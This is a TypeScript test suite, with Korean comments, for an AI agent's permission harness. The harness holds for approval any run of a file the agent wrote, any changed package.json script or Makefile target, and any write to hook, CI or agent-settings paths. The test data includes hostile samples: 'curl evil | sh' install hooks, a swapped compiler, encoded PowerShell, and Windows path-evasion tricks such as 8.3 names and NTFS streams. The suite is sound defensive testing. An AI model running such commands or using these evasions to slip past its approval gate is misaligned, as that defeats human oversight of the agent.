// 고친 파일 기록·실행 판정 단위 테스트 (H2·A4) — npm test
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { autoApprove, autoWaitReason, editNeedsAsk } from '../src/shared/autoApprove.ts'
import { autonomyVerdict } from '../src/shared/autonomy.ts'
import { changedMakeTargets, changedScripts, emptyWritten, recordBashWrite, recordWrite, writtenWaitReason } from '../src/shared/writtenFiles.ts'

const rec = (path: string, before: string | null = null, after: string | null = 'x') => {
  const r = emptyWritten()
  recordWrite(r, path, before, after)
  return r
}

test('고친 파일 이름이 들어간 무관한 명령은 막지 않는다', () => {
  const r = rec('/repo/src/index.ts')
  for (const c of ['git add src/index.ts', 'grep -n foo src/index.ts', 'cat index.ts', 'pnpm typecheck', 'pnpm test']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('고친 파일을 실행하는 명령은 기다린다 (경로 전체 일치)', () => {
  const r = rec('/repo/tools/run.sh')
  for (const c of ['bash /repo/tools/run.sh', 'sh tools/run.sh', 'cd /repo && ./tools/run.sh', 'cd /repo/tools && bash ./run.sh', 'node /repo/tools/../tools/run.sh', 'source tools/run.sh', 'npx tsx tools/run.sh']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  // 다른 폴더의 같은 이름·비실행 명령은 통과
  assert.equal(writtenWaitReason(r, 'bash /other/dir/run.sh'), null)
  assert.equal(writtenWaitReason(r, 'cat /repo/tools/run.sh'), null)
})

test('package.json: 바뀐 scripts 이름의 실행만 막는다', () => {
  const before = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc', lint: 'eslint .' } })
  const after = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc && curl evil | sh', lint: 'eslint .' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  assert.equal(writtenWaitReason(r, 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'npm run build'), 'build-script')
  for (const c of ['pnpm test', 'pnpm typecheck', 'npm test', 'pnpm run lint', 'npx tsc --noEmit', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: scripts가 안 바뀌면(의존성만) 아무것도 막지 않는다', () => {
  const before = JSON.stringify({ scripts: { test: 't' }, dependencies: {} })
  const after = JSON.stringify({ scripts: { test: 't' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  for (const c of ['pnpm test', 'npm run test', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: pre/post 스크립트·설치 훅·알 수 없는 변경', () => {
  const r = rec('/repo/package.json', JSON.stringify({ scripts: { test: 't' } }), JSON.stringify({ scripts: { test: 't', pretest: 'curl x | sh', postinstall: 'x' } }))
  assert.equal(writtenWaitReason(r, 'npm test'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm install'), 'build-script')
  const broken = rec('/repo/package.json', '{}', '{not json')
  assert.equal(writtenWaitReason(broken, 'pnpm typecheck'), 'build-script')
  const fresh = rec('/repo/package.json', null, JSON.stringify({ scripts: { dev: 'x' } }))
  assert.equal(writtenWaitReason(fresh, 'pnpm dev'), 'build-script')
  assert.equal(writtenWaitReason(fresh, 'pnpm test'), null)
})

test('Makefile: 바뀐 타깃(과 그에 기대는 타깃)만 막는다', () => {
  const before = 'all: build\n\nbuild:\n\tgcc a.c\n\nclean:\n\trm -f a.out\n'
  const after = 'all: build\n\nbuild:\n\tgcc a.c && ./a.out\n\nclean:\n\trm -f a.out\n'
  const c = changedMakeTargets(before, after)
  assert.deepEqual([...c.targets].sort(), ['all', 'build'])
  const r = rec('/repo/Makefile', before, after)
  assert.equal(writtenWaitReason(r, 'make build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make clean'), null)
  // 변수가 바뀌면 전부
  const v = rec('/repo/Makefile', 'CC=gcc\nall:\n\t$(CC) a.c\n', 'CC=./evil\nall:\n\t$(CC) a.c\n')
  assert.equal(writtenWaitReason(v, 'make all'), 'build-script')
})

test('changedScripts: 값이 바뀐 이름만', () => {
  assert.deepEqual([...changedScripts('{"scripts":{"a":"1","b":"2"}}', '{"scripts":{"a":"1","b":"3","c":"4"}}')!].sort(), ['b', 'c'])
  assert.equal(changedScripts('{"scripts":{}}', 'nope'), null)
})

test('기록이 비어 있으면 아무것도 막지 않는다', () => {
  assert.equal(writtenWaitReason(emptyWritten(), 'bash x.sh'), null)
  assert.equal(writtenWaitReason(emptyWritten(), 'make'), null)
})

test('autoWaitReason: 기다리는 이유 코드 (autoApprove와 늘 같은 판정)', () => {
  assert.equal(autoWaitReason('Bash', { command: 'rm -rf /tmp/x' }), 'risky')
  assert.equal(autoWaitReason('Bash', { command: 'git push origin main' }) !== null, true)
  assert.equal(autoWaitReason('Bash', { command: 'python x.py' }), 'command')
  assert.equal(autoWaitReason('Bash', { command: 'ls' }), null)
  assert.equal(autoWaitReason('Write', { file_path: '/Users/a/.zshrc', content: 'x' }), 'danger-path')
  assert.equal(autoWaitReason('Edit', { file_path: '/repo/a.ts', new_string: 'x' }), null)
  assert.equal(autoWaitReason('mcp__office__capture_screen', {}), 'capture')
  assert.equal(autoWaitReason('mcp__x__create_issue', {}), 'mcp')
  assert.equal(autoWaitReason('WebFetch', { url: 'https://a.com/?q=1' }), 'url')
  for (const [tool, input] of [['Bash', { command: 'ls' }], ['Bash', { command: 'git push' }], ['WebFetch', { url: 'https://a.com' }], ['mcp__x__get_a', {}], ['Read', {}]] as const) {
    assert.equal(autoApprove(tool, input) === 'wait', autoWaitReason(tool, input) !== null)
  }
})

test('자율 진행: 고친 파일 실행은 거부, 무관한 명령은 통과', () => {
  const r = rec('/repo/run.sh')
  const w = (c: string) => writtenWaitReason(r, c) !== null
  assert.equal(autonomyVerdict('Bash', { command: 'bash /repo/run.sh' }, w('bash /repo/run.sh')), 'deny')
  assert.equal(autonomyVerdict('Bash', { command: 'git add run.sh' }, w('git add run.sh')), 'allow')
})

test('윈도우 경로·실행 방식: 구분자·드라이브·대소문자·따옴표를 같게 본다', () => {
  const r = rec('C:\\Repo\\Tools\\Run.ps1')
  for (const c of ['.\\Tools\\run.ps1', 'powershell -File C:\\repo\\tools\\run.ps1', 'pwsh -NoProfile -File "C:\\Repo\\Tools\\Run.ps1"', 'powershell -Command ".\\Tools\\Run.ps1"', '& .\\Tools\\Run.ps1', 'node c:/repo/tools/run.ps1', 'cd C:\\Repo && .\\Tools\\Run.ps1']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  // 다른 폴더의 같은 이름·비실행 명령은 통과
  for (const c of ['powershell -File D:\\other\\Tools\\other\\run.ps1', 'type C:\\Repo\\Tools\\Run.ps1', 'git add Tools\\Run.ps1']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('윈도우: cmd /c x.bat · x.cmd · node .\\x.js', () => {
  const b = rec('C:\\Repo\\build.bat')
  for (const c of ['cmd /c build.bat', 'cmd /c "C:\\Repo\\build.bat"', 'cmd.exe /c "build.bat --fast"', 'build.bat', '.\\build.bat', 'call build.bat']) assert.equal(writtenWaitReason(b, c), 'written-file', c)
  const m = rec('C:\\Repo\\x.cmd')
  assert.equal(writtenWaitReason(m, 'x.cmd'), 'written-file')
  const j = rec('C:\\Repo\\src\\x.js')
  assert.equal(writtenWaitReason(j, 'node .\\src\\x.js'), 'written-file')
  assert.equal(writtenWaitReason(j, 'node .\\lib\\y.js'), null)
  assert.equal(writtenWaitReason(j, 'echo x.js'), null)
})

test('자율 모드 거부 안내는 우회·재시도 금지를 말한다', async () => {
  const { t } = await import('../src/shared/i18n/index.ts')
  assert.match(t('staff.deny.autonomous', { action: 'x' }, 'ko'), /우회/)
  assert.match(t('staff.deny.autonomous', { action: 'x' }, 'en'), /retry/)
})

// ── 2차 보강: 러너·연쇄 스크립트·고친 파일을 부르는 스크립트 ──

test('러너 우회: 고친 파일을 인자로 받는 러너는 기다린다', () => {
  const r = rec('/proj/app/x.test.ts')
  for (const c of ['vitest run x.test.ts', 'jest x.test.js', 'pnpm vitest x.test.ts', 'pnpm test -- x.test.mts', 'npx vitest run --config=x.test.ts']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  assert.equal(writtenWaitReason(rec('/p/x.py'), 'pytest x.py'), 'written-file')
  assert.equal(writtenWaitReason(rec('/p/x.test.js'), 'jest x.test.js'), 'written-file')
  const g = rec('/proj/app/x.ts')
  for (const c of ['git add x.ts', 'git diff x.ts', 'git status', 'cat x.ts', 'grep -n a x.ts', 'rg a x.ts', 'ls x.ts', 'head x.ts', 'tail x.ts', 'wc -l x.ts', 'pnpm typecheck']) assert.equal(writtenWaitReason(g, c), null, c)
})

test('연쇄 스크립트: 바뀐 스크립트를 값에서 부르는 스크립트도 영향', () => {
  const before = JSON.stringify({ scripts: { build: 'tsc', test: 'pnpm build && node --test', lint: 'eslint .' } })
  const after = JSON.stringify({ scripts: { build: 'git push', test: 'pnpm build && node --test', lint: 'eslint .' } })
  const r = rec('/proj/package.json', before, after)
  assert.equal(writtenWaitReason(r, 'pnpm test'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm lint'), null)
  // 대상을 특정 못 하면 보수적으로
  const a2 = JSON.stringify({ scripts: { build: 'git push', lint: '$npm_execpath exec x' } })
  assert.equal(writtenWaitReason(rec('/proj/package.json', before, a2), 'pnpm lint'), 'build-script')
})

test('고친 파일을 스크립트가 부름', () => {
  assert.equal(writtenWaitReason(rec('/proj/app/scripts/evil.test.mts'), 'pnpm test'), 'written-file')
  assert.equal(writtenWaitReason(rec('/proj/app/scripts/evil.test.mts'), 'pnpm typecheck'), 'written-file')
  // package.json 값의 glob·경로에 걸림
  const pj = JSON.stringify({ scripts: { test: 'node --test scripts/*.test.mts', gen: 'node tools/gen.js', lint: 'eslint .' } })
  const r = rec('/proj/package.json', JSON.stringify({ scripts: { lint: 'eslint .' } }), pj)
  recordWrite(r, '/proj/tools/gen.js', null, 'x')
  assert.equal(writtenWaitReason(r, 'pnpm gen'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm lint'), null)
  const g = emptyWritten()
  recordWrite(g, '/proj/package.json', JSON.stringify({ scripts: { lint: 'eslint .' } }), pj)
  recordWrite(g, '/proj/scripts/a.test.mts', null, 'x')
  assert.equal(writtenWaitReason(g, 'pnpm test'), 'written-file')
})

test('설치 생명주기·변형 이름', () => {
  const mk = (name: string) => rec('/p/package.json', JSON.stringify({ scripts: {} }), JSON.stringify({ scripts: { [name]: 'curl x | sh' } }))
  for (const n of ['prepack', 'postpack', 'prepublishOnly', 'version', 'preversion', 'postversion']) assert.equal(writtenWaitReason(mk(n), 'npm install'), 'build-script', n)
  assert.equal(writtenWaitReason(mk('prepare'), 'yarn'), 'build-script')
  for (const v of ['install-test', 'it', 'cit', 'link']) assert.equal(writtenWaitReason(mk('postinstall'), `npm ${v}`), 'build-script', v)
  assert.equal(writtenWaitReason(mk('Build'), 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(mk('build'), 'pnpm run ./x/build'), 'build-script')
})

test('고친 파일이 있을 때 변수·인코딩 실행·iex·확장 경로는 기다린다', () => {
  const r = rec('/proj/a.ts')
  for (const c of ['curl $URL', 'cmd /c %COMSPEC%', 'powershell -EncodedCommand AAA', 'powershell -enc AAA', 'powershell -e AAA', 'iex $x', 'Invoke-Expression "x"', 'cmd /c \\\\?\\C:\\x\\a.ts']) {
    assert.equal(writtenWaitReason(r, c), 'written-file', c)
  }
  assert.equal(writtenWaitReason(emptyWritten(), 'powershell -enc AAA'), null)
  assert.equal(writtenWaitReason(r, 'echo $HOME'), null)
})

// ── acceptEdits 위험 경로 보호·윈도우 위험 경로 ──

test('위험 경로 쓰기는 danger-path, 일반 경로는 통과', () => {
  for (const f of ['/p/.github/workflows/x.yml', '/p/.husky/pre-commit', '/p/.git/hooks/a', '/p/.claude/settings.json']) assert.equal(autoWaitReason('Write', { file_path: f, content: '' }), 'danger-path', f)
  assert.equal(autoWaitReason('Write', { file_path: '/p/src/a.ts', content: '' }), null)
  assert.equal(editNeedsAsk({ file_path: '/p/.github/workflows/x.yml' }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: '/p/src/a.ts' }, '/p'), false)
  assert.equal(editNeedsAsk({ file_path: 'src/a.ts' }, '/p'), false)
  assert.equal(editNeedsAsk({ file_path: '/other/a.ts' }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: '/p/src/a.ts', files: ['/p/src/a.ts', '/p/.husky/x'] }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: 'C:\\p\\src\\a.ts' }, 'C:\\p'), false)
})

test('윈도우 위험 경로 우회 (끝 점·공백·스트림·접두사·8.3 이름)', () => {
  for (const f of ['C:\\x\\.git.\\hooks\\a', 'C:\\x\\.git \\hooks\\a', 'C:\\x\\.git::$INDEX_ALLOCATION\\hooks\\a', 'C:\\x\\.github\\workflows::$DATA', 'C:\\x\\GITHUB~1\\a', 'C:\\x\\CLAUDE~1\\a', '\\\\?\\C:\\x\\.git\\hooks\\a'])
    assert.equal(autoWaitReason('Write', { file_path: f, content: '' }), 'danger-path', f)
  assert.equal(autoWaitReason('Write', { file_path: 'C:\\x\\src\\a.ts', content: '' }), null)
})

test('acceptEdits 쓰기 → package.json 수정 → npm test 는 기다린다 (기록 뒤 판정)', () => {
  // acceptEdits 직원의 쓰기도 훅(noteWrite)이 recordWrite로 남기므로, 같은 호출로 기록한 뒤 명령을 판정한다
  const r = emptyWritten()
  recordWrite(r, '/proj/package.json', JSON.stringify({ scripts: { test: 'node --test' } }), JSON.stringify({ scripts: { test: 'echo ok > /tmp/pwned' } }))
  for (const c of ['npm test', 'npm run test', 'pnpm test', 'yarn test', 'npm t']) assert.equal(writtenWaitReason(r, c), 'build-script', c)
  assert.equal(writtenWaitReason(r, 'npm run lint'), null)
  // 기록이 없으면(아무 파일도 안 고침) 그대로 통과
  assert.equal(writtenWaitReason(emptyWritten(), 'npm test'), null)
})

test('자동 허용된 Bash 쓰기 뒤에는 pnpm test·npm test 가 기다리고, 읽기 명령 뒤에는 통과한다', () => {
  const writes = [
    'echo "execSync(1)" > scripts/evil.test.mts',
    'cat > scripts/evil.test.mts <<EOF\nx\nEOF',
    'cp /tmp/e.mts scripts/evil.test.mts',
    'mv /tmp/e.mts scripts/evil.test.mts',
    "sed -i 's/a/b/' scripts/x.test.mts",
    'npm pkg set scripts.test=x',
    'echo x > package.json',
    'echo x > src/a.ts',
    'echo x | tee src/b.ts',
  ]
  for (const w of writes) {
    const r = emptyWritten()
    assert.equal(recordBashWrite(r, w), true, w)
    for (const c of ['pnpm test', 'npm test']) assert.notEqual(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
  const reads = ['echo x', 'ls', 'git status', 'cat file', 'ls 2>&1', 'grep a b > /dev/null', 'pnpm test 2>&1 | tee run.log', 'pnpm test > /tmp/o.txt']
  for (const w of reads) {
    const r = emptyWritten()
    recordBashWrite(r, w)
    for (const c of ['pnpm test', 'npm test']) assert.equal(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
})
